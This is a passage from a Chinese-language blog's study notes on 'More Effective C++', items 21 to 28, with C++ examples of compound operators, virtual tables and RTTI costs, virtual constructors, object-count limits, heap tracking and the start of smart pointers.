class="hljs-keyword">const</span> UPInt&amp; lhs, <br>                      <span class="hljs-keyword">int</span> rhs);<br><span class="hljs-keyword">const</span> UPInt <span class="hljs-keyword">operator</span>+(<span class="hljs-keyword">int</span> lhs, <br>                      <span class="hljs-keyword">const</span> UPInt&amp; rhs);<br><br><span class="hljs-comment">// 错误</span><br><span class="hljs-keyword">const</span> UPInt <span class="hljs-keyword">operator</span>+(<span class="hljs-keyword">int</span> lhs, <span class="hljs-keyword">int</span> rhs);<br></code></pre></div></td></tr></table></figure><p>增加一堆重载函数不一定是好事，除非能保证这样对程序效率有很大的改善。</p><h3><span id="条款22考虑以操作符复合形式op取代其独身形式op"><strong>条款22：考虑以操作符复合形式（op=）取代其独身形式（op）</strong></span></h3><p>一个好方法就是以复合形式（例如，operator+=）为基础实现独身形式（例如，operator+）。</p><p>3 个与效率有关的情况值得注意。</p><ol type="1"><li><p>第一，一般而言，复合操作符比其对应的独身版本效率高。因为独身版本通常必须返回一个新对象，而我们必须因此负担一个临时对象的构造和析构成本（见条款19和20）。复合版本则是直接将结果写入其左端自变量，所以不需要产生一个临时对象来放置返回值。</p></li><li><p>第二，如果同时提供某个操作符的复合形式和独身形式，那就是在允许你的客户在效率与便利性之间自行取舍。</p></li><li><p>第三、匿名对象总是比命名对象更容易被消除，所以当你面临命名对象或临时对象的抉择时，最好选择临时对象。匿名对象有可能降低成本（尤其在搭配旧式编译器时）。</p></li></ol><h3><span id="条款23考虑使用其他程序库"><strong>条款23：考虑使用其他程序库</strong></span></h3><p>不同的程序库即使提供相似的功能，也往往有不同的性能取舍策略，所以一旦你找出程序的瓶颈，你应该思考是否有可能使用其他程序库，来移除了那些瓶颈。</p><p>比如，iostream 相比于 stdio，iostream有类型安全的特性，可扩展性好；而 stdio 更节省程序空间、速度更快。</p><h3><span id="条款24了解-virtual-functions-multiple-inheritance-virtual-baseclass-runtime-type-identification的成本"><strong>条款24：了解 virtual functions、multiple inheritance、virtual baseclass、runtime type identification的成本</strong></span></h3><p>当一个虚函数被调用，执行的代码必须对应于“调用者（对象）的动态类型”。</p><p>大部分编译器使用 virtual tables（vtbls）和 virtual tablepointers（vptrs）实现动态类型。</p><h4><span id="virtual-tablesvtbls">virtual tables（vtbls）</span></h4><p>vtbl 通常是一个由“函数指针”数组。某些编译器会以链表（linkedlist）取代数组，但其基本策略相同。程序中的每一个class，只要声明（或继承）虚函数者，都有自己的一个vtbl，而其中的条目（entries）就是该 class的各个虚函数具体实现的指针。</p><blockquote><p>虚函数的第一个成本：你必须为每个拥有虚函数的 class 耗费一个 vtbl空间，其大小视虚函数的个数（包括继承而来的）而定。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1</span> &#123;</span> <br><span class="hljs-keyword">public</span>: <br>    C1(); <br>    <span class="hljs-keyword">virtual</span> ~C1(); <br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span></span>; <br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">int</span> <span class="hljs-title">f2</span><span class="hljs-params">(<span class="hljs-keyword">char</span> c)</span> <span class="hljs-keyword">const</span></span>; <br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">f3</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; s)</span></span>; <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f4</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>; <br>    ...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>C1 的 virtual table 数组看起来如下图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/RacleRay/image_storage/image/picgo-clipboard-images/01/09/11-05-7e8b8b23cd97340a633da2809379be41-86df73.png" style="zoom:60%;"></p><p>注意非虚函数 f4 不在表中，而且 C1 的构造函数也不在。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C2</span>:</span> <span class="hljs-keyword">public</span> C1 &#123; <br><span class="hljs-keyword">public</span>: <br>    C2();<br>    <span class="hljs-keyword">virtual</span> ~C2(); <br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">f5</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span>;<br>    ... <br>&#125;;<br></code></pre></div></td></tr></table></figure><p>它的 virtual table 中包括指向没有被 C2 重定义的 C1 虚函数的指针：</p><p><img src="https://cdn.jsdelivr.net/gh/RacleRay/image_storage/image/picgo-clipboard-images/01/09/11-06-017184f84b042ac7641a5641eadde63b-e68c42.png" style="zoom:60%;"></p><h4><span id="virtual-tablepointersvptrs">virtual tablepointers（vptrs）</span></h4><p>Virtual tables只是虚函数实现机构的一半而已。如果只有它，不能成气候。还需要某种方法可以指示出每个对象对应于哪一个vtbl，vtbl 才真的有用。而这正是virtual table pointer（vptr）的任务。</p><p>凡声明有虚函数的 class，其对象都含有一个隐藏的 datamember，vptr，用来指向该class 的 vtbl。这个隐藏的 data member被编译器加入对象内某个只有编译器才知道的位置。</p><blockquote><p>虚函数的第二个成本：你必须在每一个拥有虚函数的对象内付出“一个额外指针”的代价。</p></blockquote><p>上述C1、C2对象关系可以表示为：</p><p><img src="https://cdn.jsdelivr.net/gh/RacleRay/image_storage/image/picgo-clipboard-images/01/09/11-06-b4df5791a07e1b887c9657b26eaad470-93458f.png" style="zoom:60%;"></p><h4><span id="虚函数的调用">虚函数的调用</span></h4><p>编译器必须产生代码，完成以下动作：</p><ol type="1"><li><p>根据对象的 vptr 找出其 vtbl。编译器成本只有一个偏移调整（offsetadjustment）就能获得 vptr，和一个指针间接动作，以便获得 vtbl。</p></li><li><p>找出被调用函数在 vtbl内的对应指针。编译器为每个虚函数指定了一个独一无二的表格索引。本步骤的成本只是一个偏移（offset），在vtbl 数组中索引。</p></li><li><p>调用步骤 2 所得指针所指向的函数。</p></li></ol><h4><span id="rtti">RTTI</span></h4><p>运行时期类型辨识（runtime typeidentification，RTTI）的成本。RTTI让我们得以在运行时期获得 objects 和 class 的相关信息。它们被存放在类型为type_info 的对象内。你可以利用 typeid 操作符取得某个class 相应的type_info 对象。</p><p>C++规范书上说，只有当某种类型拥有至少一个虚函数，才保证我们能够检验该类型对象的动态类型。RTTI的设计理念是：根据 class 的 vtbl 来实现。</p><p>RTTI 耗费的空间是在每个类的 vtbl 中的占用的额外单元再加上存储type_info 对象的空间。就像在多数程序里 virtual table所占的内存空间并不值得注意一样，你也不太可能因为 type_info对象大小而遇到问题。</p><blockquote><p>RTTI的代价：type_info 占用的空间。</p></blockquote><p>假如 type_info 才是完整的 vtbl 内存布局：</p><p><img src="https://cdn.jsdelivr.net/gh/RacleRay/image_storage/image/picgo-clipboard-images/01/09/11-07-07cb25dbc48998d28eb0760f5a15851d-54a97c.png" style="zoom:60%;"></p><h4><span id="多继承">多继承</span></h4><p>多继承经常导致对虚基类的需求。</p><p>没有虚基类，如果一个派生类有一个以上从基类的继承路径，基类的数据成员被复制到每一个继承类对象里，继承类与基类间的每条路径都有一个拷贝。</p><p>把基类定义为虚基类则可以消除这种复制。虚基类的实现经常使用指向虚基类的指针做为避免复制的手段，一个或者更多的指针被存储在对象里。</p><blockquote><p>另一种代价：虚基类的实现经常使用指向虚基类的指针。</p></blockquote><p>比如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>:</span> &#123;...&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span>:</span> <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> A &#123; ... &#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span>:</span> <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> A &#123; ... &#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span>:</span> <span class="hljs-keyword">public</span> B, <span class="hljs-keyword">public</span> C &#123;...&#125;;<br></code></pre></div></td></tr></table></figure><p>如果 A 中没有虚函数，D对象内存布局为：</p><p><img src="https://cdn.jsdelivr.net/gh/RacleRay/image_storage/image/picgo-clipboard-images/01/09/11-08-893932ec8ed2cf74a54cb1ee5e6b1b38-629291.png" style="zoom:60%;"></p><p>如果 A 中有虚函数，D对象内存布局为：</p><p><img src="https://cdn.jsdelivr.net/gh/RacleRay/image_storage/image/picgo-clipboard-images/01/09/11-09-28e750fe806a975a2313af3ff7e681a7-8f6f1f.png" style="zoom:60%;"></p><h2><span id="五-技术">五、技术</span></h2><h3><span id="条款25将-constructor-和-non-member-functions-虚化"><strong>条款25：将 constructor 和 non-member functions 虚化</strong></span></h3><p>此处所谓 virtual 不是虚函数的 virtual，而是类似、形似的意思。</p><p>模仿 constructor的行为，但能够视其获得的输入，产生不同类型的对象，所以称之为 virtualconstructor。Virtual constructor在许多情况下有用，其中之一就是从磁盘（或网络或磁带等）读取对象信息。</p><p>例如，假设你编写一个程序，用来进行新闻报道的工作，每一条新闻报道都由文字或图片组成。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NLComponent</span> &#123;</span>  <span class="hljs-comment">// 抽象基类，包含至少一个纯虚函数</span><br><span class="hljs-keyword">public</span>: <br>    ...<br>&#125;; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TextBlock</span>:</span> <span class="hljs-keyword">public</span> NLComponent &#123; <br><span class="hljs-keyword">public</span>: <br>    ...  <span class="hljs-comment">// 不包含纯虚函数</span><br>&#125;; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Graphic</span>:</span> <span class="hljs-keyword">public</span> NLComponent &#123; <br><span class="hljs-keyword">public</span>:<br>... <span class="hljs-comment">// 不包含纯虚函数</span><br>&#125;; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewsLetter</span> &#123;</span> <br><span class="hljs-keyword">public</span>:<br>    NewsLetter(istream&amp; str);<br>...<br><span class="hljs-keyword">private</span>: <br>    <span class="hljs-built_in">list</span>&lt;NLComponent*&gt; components;<br>    <span class="hljs-comment">// virtual constructor</span><br>    <span class="hljs-comment">// 为建立下一个 NLComponent 对象从 str 读取数据</span><br>    <span class="hljs-comment">// 建立 component 并返回一个指针</span><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> NLComponent* <span class="hljs-title">readComponent</span><span class="hljs-params">(istream&amp; str)</span></span>;<br>&#125;;<br><br>NewsLetter::NewsLetter(istream&amp; str) &#123;<br><span class="hljs-keyword">while</span> (str) &#123;<br>        components.push_back(readComponent(str));<br>&#125; &#125;<br></code></pre></div></td></tr></table></figure><p>readComponent 所做的工作。它根据所读取的数据建立了一个新对象，或是TextBlock 或是 Graphic。</p><p>virtual copy constructor 是一种特别的 virtual constructor 。Virtualcopy constructor会返回一个指针，指向其调用者（某对象）的一个新副本。基于这种行为，virtualcopy constructors 通常以 copySelf 或cloneSelf 命名，或者像下面一样命名为clone。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NLComponent</span> &#123;</span>  <span class="hljs-comment">// 抽象基类，包含至少一个纯虚函数</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> NLComponent * <span class="hljs-title">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>= <span class="hljs-number">0</span>;<br>    ...<br>&#125;; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TextBlock</span>:</span> <span class="hljs-keyword">public</span> NLComponent &#123; <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> TextBlock * <span class="hljs-title">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>&#123; <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TextBlock(*<span class="hljs-keyword">this</span>); &#125;<br>    ...<br>&#125;; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Graphic</span>:</span> <span class="hljs-keyword">public</span> NLComponent &#123; <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> Graphic * <span class="hljs-title">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>&#123; <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Graphic(*<span class="hljs-keyword">this</span>); &#125;<br>... <br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewsLetter</span> &#123;</span> <br><span class="hljs-keyword">public</span>:<br>    NewsLetter(istream&amp; rhs);<br>...<br><span class="hljs-keyword">private</span>: <br>    <span class="hljs-built_in">list</span>&lt;NLComponent*&gt; components;<br>&#125;;<br><br>NewsLetter::NewsLetter(<span class="hljs-keyword">const</span> NewsLetter&amp; rhs) &#123;<br><span class="hljs-comment">// 遍历整个 rhs 链表，使用每个元素的虚拟拷贝构造函数 </span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">list</span>&lt;NLComponent*&gt;::const_iterator it = rhs.components.<span class="hljs-built_in">begin</span>(); <br>         it != rhs.components.<span class="hljs-built_in">end</span>(); <br>         ++it) &#123;<br>        components.push_back((*it)-&gt;clone());<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>non-member functions也可以进行虚化。编写一个虚函数来完成工作，然后再写一个非虚函数，它什么也不做只是调用这个虚函数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NLComponent</span> &#123;</span>  <span class="hljs-comment">// 抽象基类，包含至少一个纯虚函数</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> ostream&amp; <span class="hljs-title">print</span><span class="hljs-params">(ostream&amp; s)</span> <span class="hljs-keyword">const</span> </span>= <span class="hljs-number">0</span>;<br>    ...<br>&#125;; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TextBlock</span>:</span> <span class="hljs-keyword">public</span> NLComponent &#123; <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> ostream&amp; <span class="hljs-title">print</span><span class="hljs-params">(ostream&amp; s)</span> <span class="hljs-keyword">const</span></span>;<br>    ...<br>&#125;; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Graphic</span>:</span> <span class="hljs-keyword">public</span> NLComponent &#123; <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> ostream&amp; <span class="hljs-title">print</span><span class="hljs-params">(ostream&amp; s)</span> <span class="hljs-keyword">const</span></span>;<br>... <br>&#125;;<br><br><span class="hljs-comment">// 非虚函数，只调用虚 print，让print完成对应工作</span><br><span class="hljs-keyword">inline</span> ostream&amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream&amp; s, <span class="hljs-keyword">const</span> NLComponent&amp; c) &#123;<br>    <span class="hljs-keyword">return</span> c.<span class="hljs-built_in">print</span>(s); <br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款26限制某个-class-所能产生的对象数量"><strong>条款26：限制某个 class 所能产生的对象数量</strong></span></h3><p>每产生一个对象，会有一个 constructor被调用。</p><p>使用 static 控制对象数量的产生，是一种方法。首先要知道：</p><ul><li>class拥有一个static成员对象时，即使从未使用到，也会被构造，且其初始化时机，并不明确；</li><li>function中有一个static对象，此对象在函数第一次被调用时才产生，且其初始化时机是明确的。</li></ul><p>“阻止某个 class 产出对象” 的最简单方法就是将其 constructor 声明为private。</p><p>一个限制对象数量的 class 设计，一个 Printer 对象实现：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Printer</span> &#123;</span><br><span class="hljs-keyword">public</span>: <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TooManyObjects</span>&#123;</span>&#125;;<br>    <span class="hljs-comment">// 伪构造函数 </span><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> Printer * <span class="hljs-title">makePrinter</span><span class="hljs-params">()</span></span>; <br>    <span class="hljs-function"><span class="hljs-keyword">static</span> Printer * <span class="hljs-title">makePrinter</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Printer&amp; rhs)</span></span>; <br>    ...<br><span class="hljs-keyword">private</span>: <br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">size_t</span> numObjects;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> maxObjects = <span class="hljs-number">10</span>;<br>Printer(); <br>    Printer(<span class="hljs-keyword">const</span> Printer&amp; rhs);<br>    ~Printer() &#123; --numObjects; &#125;<br>&#125;;<br><br><span class="hljs-comment">// class static 必须进行定义</span><br><span class="hljs-keyword">size_t</span> Printer::numObjects = <span class="hljs-number">0</span>; <br><span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> Printer::maxObjects;<br><br><span class="hljs-comment">// 提取一个 init() 函数完成公用的初始化工作也是可以的</span><br>Printer::Printer() &#123;<br><span class="hljs-keyword">if</span> (numObjects &gt;= maxObjects) &#123; <br>        <span class="hljs-keyword">throw</span> TooManyObjects();<br>    &#125; <br>    ++numObjects;<br>    ...<br>&#125; <br>Printer::Printer(<span class="hljs-keyword">const</span> Printer&amp; rhs) &#123;<br>    <span class="hljs-keyword">if</span> (numObjects &gt;= maxObjects) &#123; <br>        <span class="hljs-keyword">throw</span> TooManyObjects();<br>&#125;<br>    ++numObjects;<br>    ...<br>&#125; <br><span class="hljs-function">Printer * <span class="hljs-title">Printer::makePrinter</span><span class="hljs-params">()</span> </span>&#123; <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Printer; <br>&#125; <br><span class="hljs-function">Printer * <span class="hljs-title">Printer::makePrinter</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Printer&amp; rhs)</span> </span>&#123; <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Printer(rhs); <br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款27要求或禁止对象产生于-heap-之中"><strong>条款27：要求（或禁止）对象产生于 heap 之中</strong></span></h3><p>有时你想这样管理某些对象，要让某种类型的对象能够自我销毁，也就是能够“deletethis”。很明显这种管理方式需要此类型对象被分配在堆中。而其它一些时候你想获得一种保障：“不在堆中分配对象，从而保证某种类型的类不会发生内存泄漏。”</p><p>判断对象是否在堆上，可以使用地址比较法，栈段地址从高到低生长，堆段地址从低到高生长。以下方法可以实现：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">onHeap</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *address)</span> </span>&#123;<br><span class="hljs-keyword">char</span> onTheStack; <br>    <span class="hljs-keyword">return</span> address &lt; &amp;onTheStack; <br>&#125;<br></code></pre></div></td></tr></table></figure><p>但是，static对象的地址在堆段地址下方，以上方法并不能确定是否是静态对象。</p><p><img src="https://cdn.jsdelivr.net/gh/RacleRay/image_storage/image/picgo-clipboard-images/01/09/11-10-85d014bfc387ddec7678fd770aa35c00-d084d8.png" style="zoom:60%;"></p><p>另一种方式，是设计 abstract mixin base class来实现判断堆对象的功能。</p><p>所谓 abstract base class 是一个不能够被实例化的 baseclass。也就是说它至少有一个纯虚函数。所谓 mixin（“mix in”）class则提供一组定义完好的能力，能够与其 derived class所可能提供的其他任何能力兼容。如此的 class几乎总是abstract。于是可以设计 abstract mixin base class，用来为 derivedclass 提供“判断某指针是否以 oeprator new 分配出来”的能力。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeapTracked</span> &#123;</span> <span class="hljs-comment">// 混合类，跟踪从 operator new 返回的 ptr</span><br><span class="hljs-keyword">public</span>: <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MissingAddress</span>&#123;</span>&#125;;<br><span class="hljs-keyword">virtual</span> ~HeapTracked() = <span class="hljs-number">0</span>; <br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>)</span></span>; <br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span>; <br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isOnHeap</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br><span class="hljs-keyword">private</span>: <br>    <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>* RawAddress; <br>    <span class="hljs-keyword">static</span> <span class="hljs-built_in">list</span>&lt;RawAddress&gt; addresses;<br>&#125;;<br><br><span class="hljs-built_in">list</span>&lt;RawAddress&gt; HeapTracked::addresses;<br><span class="hljs-comment">// HeapTracked 的析构函数是纯虚函数，使得该类变为抽象类</span><br>HeapTracked::~HeapTracked() &#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> * HeapTracked::<span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>)</span> </span>&#123;<br><span class="hljs-keyword">void</span> *memPtr = ::<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-built_in">size</span>);<br>    addresses.push_front(memPtr);<br>    <span class="hljs-keyword">return</span> memPtr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> HeapTracked::<span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span> </span>&#123;<br>    <span class="hljs-built_in">list</span>&lt;RawAddress&gt;::iterator it = <span class="hljs-built_in">find</span>(addresses.<span class="hljs-built_in">begin</span>(), addresses.<span class="hljs-built_in">end</span>(), ptr); <br>    <span class="hljs-keyword">if</span> (it != addresses.<span class="hljs-built_in">end</span>()) &#123;<br>addresses.erase(it); <br>        ::<span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(ptr)</span></span>;<br>&#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-keyword">throw</span> MissingAddress(); <br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">HeapTracked::isOnHeap</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>&#123;<br><span class="hljs-comment">// 得到一个指针，指向*this占据的内存空间的起始处</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *rawAddress = <span class="hljs-keyword">dynamic_cast</span>&lt;<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*&gt;(<span class="hljs-keyword">this</span>);<br>    <span class="hljs-built_in">list</span>&lt;RawAddress&gt;::iterator it = <span class="hljs-built_in">find</span>(addresses.<span class="hljs-built_in">begin</span>(), addresses.<span class="hljs-built_in">end</span>(), rawAddress); <br>    <span class="hljs-keyword">return</span> it != addresses.<span class="hljs-built_in">end</span>();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果是在堆上分配内存，就会调用 operator new，可以通过 isOnHeap判断是否在堆上。只要继承自 HeapTracked 类的子类，就都有了 isOnHeap的功能。</p><p>如果要禁止对象在堆上分配内存，将 operator new 设计为 private是一种简单的方式。</p><h3><span id="条款-28smartpointers智能指针"><strong>条款 28：SmartPointers（智能指针）</strong></span></h3><p>当你以 smart pointers 取代 C++的内建指针（亦即 dumbpointers），你将获得以下各种指针行为的控制权：</p><ul><li>构造和析构（Construction and Destruction）。你可以决定smart pointer被产生以及被销毁时发生什么事。通常我们会给 smart 